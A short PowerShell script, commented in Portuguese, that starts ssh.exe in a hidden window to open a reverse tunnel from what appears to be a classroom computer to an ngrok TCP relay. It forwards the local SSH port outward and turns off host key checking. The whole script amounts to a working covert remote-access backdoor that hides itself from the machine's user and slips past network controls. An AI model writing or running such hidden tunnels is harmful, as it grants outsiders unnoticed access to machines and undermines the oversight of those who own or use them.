# Caminho do SSH
$sshPath = "C:\Program Files\OpenSSH\ssh.exe"

# Caminho da chave privada
$keyPath = "C:\Users\SALA 1 ANO B\.ssh\ssh_key"

# Argumentos da conexão SSH
$arguments = "-i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 u0_a434@0.tcp.sa.ngrok.io -p 12487 -N -vvv"

# Executa o SSH de forma invisível
Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden
